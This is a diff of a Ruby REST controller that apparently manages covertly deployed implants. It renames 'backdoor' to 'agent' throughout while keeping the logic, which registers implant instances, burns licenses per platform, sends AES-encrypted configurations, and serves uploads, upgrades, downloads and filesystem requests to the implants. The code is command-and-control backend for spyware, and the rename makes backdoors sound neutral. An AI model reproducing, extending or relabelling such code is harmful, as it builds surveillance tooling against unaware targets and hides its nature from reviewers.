@@ -1,5 +1,5 @@
 #
-# Controller for the Backdoor objects
+# Controller for the Agent objects
 #
 require 'rcs-db/license'
 require 'rcs-common/crypt'
@@ -17,7 +17,7 @@ class AgentController < RESTController
     filter ||= {}
     
     mongoid_query do
-      items = ::Item.backdoors.where(filter)
+      items = ::Item.agents.where(filter)
         .any_in(_id: @session[:accessible])
         .only(:name, :desc, :status, :_kind, :path, :stat)
       
@@ -29,7 +29,7 @@ class AgentController < RESTController
     require_auth_level :tech, :view
     
     mongoid_query do
-      item = Item.backdoors
+      item = Item.agents
         .any_in(_id: @session[:accessible])
         .only(:name, :desc, :status, :_kind, :path, :stat, :ident, :upgradable, :group_ids, :counter)
         .find(@params['_id'])
@@ -44,7 +44,7 @@ class AgentController < RESTController
     updatable_fields = ['name', 'desc', 'status']
     
     mongoid_query do
-      item = Item.backdoors.any_in(_id: @session[:accessible]).find(@params['_id'])
+      item = Item.agents.any_in(_id: @session[:accessible]).find(@params['_id'])
       
       @params.delete_if {|k, v| not updatable_fields.include? k }
       
@@ -67,7 +67,7 @@ class AgentController < RESTController
     require_auth_level :tech
     
     mongoid_query do
-      item = Item.backdoors.any_in(_id: @session[:accessible]).find(@params['_id'])
+      item = Item.agents.any_in(_id: @session[:accessible]).find(@params['_id'])
       item.destroy
       
       Audit.log :actor => @session[:user][:name],
@@ -79,7 +79,7 @@ class AgentController < RESTController
     end
   end
   
-  # retrieve the factory key of the backdoors
+  # retrieve the factory key of the agents
   # if the parameter is specified, it take only that class
   # otherwise, return all the keys for all the classes
   def factory_keys
@@ -102,15 +102,15 @@ class AgentController < RESTController
     return RESTController.reply.ok(classes)
   end
   
-  # retrieve the status of a backdoor instance.
+  # retrieve the status of a agent instance.
   def status
     require_auth_level :server
     
-    # parse the platform to check if the backdoor is in demo mode ( -DEMO appended )
+    # parse the platform to check if the agent is in demo mode ( -DEMO appended )
     demo = @params['subtype'].end_with? '-DEMO'
     platform = @params['subtype'].gsub(/-DEMO/, '').downcase
     
-    # retro compatibility for older backdoors (pre 8.0) sending win32, win64, ios, osx
+    # retro compatibility for older agents (pre 8.0) sending win32, win64, ios, osx
     case platform
       when 'win32', 'win64'
         platform = 'windows'
@@ -122,21 +122,21 @@ class AgentController < RESTController
         platform = 'osx'
     end
     
-    # is the backdoor already in the database? (has it synchronized at least one time?)
-    backdoor = Item.where({_kind: 'backdoor', ident: @params['ident'], instance: @params['instance'], platform: platform, demo: demo}).first
+    # is the agent already in the database? (has it synchronized at least one time?)
+    agent = Item.where({_kind: 'agent', ident: @params['ident'], instance: @params['instance'], platform: platform, demo: demo}).first
 
     # yes it is, return the status
-    unless backdoor.nil?
-      trace :info, "#{backdoor[:name]} is synchronizing (#{backdoor[:status]})"
+    unless agent.nil?
+      trace :info, "#{agent[:name]} is synchronizing (#{agent[:status]})"
 
-      # if the backdoor was queued, but now we have a license, use it and set the status to open
-      # a demo backdoor will never be queued
-      if backdoor[:status] == 'queued' and LicenseManager.instance.burn_one_license(backdoor.type.to_sym, backdoor.platform.to_sym) then
-        backdoor.status = 'open'
-        backdoor.save
+      # if the agent was queued, but now we have a license, use it and set the status to open
+      # a demo agent will never be queued
+      if agent[:status] == 'queued' and LicenseManager.instance.burn_one_license(agent.type.to_sym, agent.platform.to_sym) then
+        agent.status = 'open'
+        agent.save
       end
 
-      status = {:deleted => backdoor[:deleted], :status => backdoor[:status].upcase, :_id => backdoor[:_id]}
+      status = {:deleted => agent[:deleted], :status => agent[:status].upcase, :_id => agent[:_id]}
       return RESTController.reply.ok(status)
     end
 
@@ -153,55 +153,55 @@ class AgentController < RESTController
     trace :info, "Creating new instance for #{factory[:ident]} (#{factory[:counter]})"
 
     # clone the new instance from the factory
-    backdoor = factory.clone_instance
+    agent = factory.clone_instance
 
     # specialize it with the platform and the unique instance
-    backdoor.platform = platform
-    backdoor.instance = @params['instance']
-    backdoor.demo = demo
+    agent.platform = platform
+    agent.instance = @params['instance']
+    agent.demo = demo
 
     # default is queued
-    backdoor.status = 'queued'
+    agent.status = 'queued'
 
     #TODO: add the upload files for the first sync
 
-    # demo backdoor don't consume any license
-    backdoor.status = 'open' if demo
+    # demo agent don't consume any license
+    agent.status = 'open' if demo
 
-    # check the license to see if we have room for another backdoor
-    if demo == false and LicenseManager.instance.burn_one_license(backdoor.type.to_sym, backdoor.platform.to_sym) then
-      backdoor.status = 'open'
+    # check the license to see if we have room for another agent
+    if demo == false and LicenseManager.instance.burn_one_license(agent.type.to_sym, agent.platform.to_sym) then
+      agent.status = 'open'
     end
 
     # save the new instance in the db
-    backdoor.save
+    agent.save
 
-    status = {:deleted => backdoor[:deleted], :status => backdoor[:status].upcase, :_id => backdoor[:_id]}
+    status = {:deleted => agent[:deleted], :status => agent[:status].upcase, :_id => agent[:_id]}
     return RESTController.reply.ok(status)
   end
 
 
   def config
-    backdoor = Item.where({_kind: 'backdoor', _id: @params['_id']}).first
+    agent = Item.where({_kind: 'agent', _id: @params['_id']}).first
 
     case @request[:method]
       when 'GET'
-        config = backdoor.configs.where(:activated.exists => false).last
+        config = agent.configs.where(:activated.exists => false).last
         return RESTController.reply.not_found if config.nil?
 
         # we have sent the configuration, wait for activation
         config.sent = Time.now.getutc.to_i
         config.save
 
-        # encrypt the config for the backdoor using the confkey
+        # encrypt the config for the agent using the confkey
         json_config = JSON.parse(config[:config])
         bson_config = BSON.serialize(json_config)
-        enc_config = aes_encrypt(bson_config.to_s, Digest::MD5.digest(backdoor[:confkey]))
+        enc_config = aes_encrypt(bson_config.to_s, Digest::MD5.digest(agent[:confkey]))
         
         return RESTController.reply.ok(enc_config, {content_type: 'binary/octet-stream'})
         
       when 'DELETE'
-        config = backdoor.configs.where(:activated.exists => false).last
+        config = agent.configs.where(:activated.exists => false).last
         config.activated = Time.now.getutc.to_i
         config.save
         trace :info, "[#{@request[:peer]}] Configuration sent [#{@params['_id']}]"
@@ -211,12 +211,12 @@ class AgentController < RESTController
   end
 
 
-  # retrieve the list of upload for a given backdoor
+  # retrieve the list of upload for a given agent
   def uploads
     require_auth_level :server, :tech
 
-    backdoor = Item.where({_kind: 'backdoor', _id: @params['_id']}).first
-    list = backdoor.upload_requests
+    agent = Item.where({_kind: 'agent', _id: @params['_id']}).first
+    list = agent.upload_requests
 
     return RESTController.reply.ok(list)
   end
@@ -227,26 +227,26 @@ class AgentController < RESTController
 
     case @request[:method]
       when 'GET'
-        backdoor = Item.where({_kind: 'backdoor', _id: @params['_id']}).first
-        upl = backdoor.upload_requests.where({ _id: @params['upload']}).first
+        agent = Item.where({_kind: 'agent', _id: @params['_id']}).first
+        upl = agent.upload_requests.where({ _id: @params['upload']}).first
         content = GridFS.instance.get upl[:_grid].first
         trace :info, "[#{@request[:peer]}] Requested the UPLOAD #{@params['upload']} -- #{content.file_length.to_s_bytes}"
         return RESTController.reply.ok(content.read, {content_type: content.content_type})
       when 'DELETE'
-        backdoor = Item.where({_kind: 'backdoor', _id: @params['_id']}).first
-        backdoor.upload_requests.destroy_all(conditions: { _id: @params['upload']})
+        agent = Item.where({_kind: 'agent', _id: @params['_id']}).first
+        agent.upload_requests.destroy_all(conditions: { _id: @params['upload']})
         trace :info, "[#{@request[:peer]}] Deleted the UPLOAD #{@params['upload']}"
     end
     
     return RESTController.reply.ok
   end
   
-  # retrieve the list of upgrade for a given backdoor
+  # retrieve the list of upgrade for a given agent
   def upgrades
     require_auth_level :server, :tech
     
-    backdoor = Item.where({_kind: 'backdoor', _id: @params['_id']}).first
-    list = backdoor.upgrade_requests
+    agent = Item.where({_kind: 'agent', _id: @params['_id']}).first
+    list = agent.upgrade_requests
 
     return RESTController.reply.ok(list)
   end
@@ -257,26 +257,26 @@ class AgentController < RESTController
 
     case @request[:method]
       when 'GET'
-        backdoor = Item.where({_kind: 'backdoor', _id: @params['_id']}).first
-        upl = backdoor.upgrade_requests.where({ _id: @params['upgrade']}).first
+        agent = Item.where({_kind: 'agent', _id: @params['_id']}).first
+        upl = agent.upgrade_requests.where({ _id: @params['upgrade']}).first
         content = GridFS.instance.get upl[:_grid].first
         trace :info, "[#{@request[:peer]}] Requested the UPGRADE #{@params['upgrade']} -- #{content.file_length.to_s_bytes}"
         return RESTController.reply.ok(content.read, {content_type: content.content_type})
       when 'DELETE'
-        backdoor = Item.where({_kind: 'backdoor', _id: @params['_id']}).first
-        backdoor.upgrade_requests.destroy_all
+        agent = Item.where({_kind: 'agent', _id: @params['_id']}).first
+        agent.upgrade_requests.destroy_all
         trace :info, "[#{@request[:peer]}] Deleted the UPGRADE #{@params['upgrade']}"
     end
     
     return RESTController.reply.ok
   end
 
-  # retrieve the list of download for a given backdoor
+  # retrieve the list of download for a given agent
   def downloads
     require_auth_level :server, :tech
 
-    backdoor = Item.where({_kind: 'backdoor', _id: @params['_id']}).first
-    list = backdoor.download_requests
+    agent = Item.where({_kind: 'agent', _id: @params['_id']}).first
+    list = agent.download_requests
 
     return RESTController.reply.ok(list)
   end
@@ -286,20 +286,20 @@ class AgentController < RESTController
 
     case @request[:method]
       when 'DELETE'
-        backdoor = Item.where({_kind: 'backdoor', _id: @params['_id']}).first
-        backdoor.download_requests.destroy_all(conditions: { _id: @params['download']})
+        agent = Item.where({_kind: 'agent', _id: @params['_id']}).first
+        agent.download_requests.destroy_all(conditions: { _id: @params['download']})
         trace :info, "[#{@request[:peer]}] Deleted the DOWNLOAD #{@params['download']}"
     end
 
     return RESTController.reply.ok
   end
 
-  # retrieve the list of filesystem for a given backdoor
+  # retrieve the list of filesystem for a given agent
   def filesystems
     require_auth_level :server, :tech
     
-    backdoor = Item.where({_kind: 'backdoor', _id: @params['_id']}).first
-    list = backdoor.filesystem_requests
+    agent = Item.where({_kind: 'agent', _id: @params['_id']}).first
+    list = agent.filesystem_requests
 
     return RESTController.reply.ok(list)
   end
@@ -309,8 +309,8 @@ class AgentController < RESTController
 
     case @request[:method]
       when 'DELETE'
-        backdoor = Item.where({_kind: 'backdoor', _id: @params['_id']}).first
-        backdoor.filesystem_requests.destroy_all(conditions: { _id: @params['filesystem']})
+        agent = Item.where({_kind: 'agent', _id: @params['_id']}).first
+        agent.filesystem_requests.destroy_all(conditions: { _id: @params['filesystem']})
         trace :info, "[#{@request[:peer]}] Deleted the FILESYSTEM #{@params['filesystem']}"
     end
     
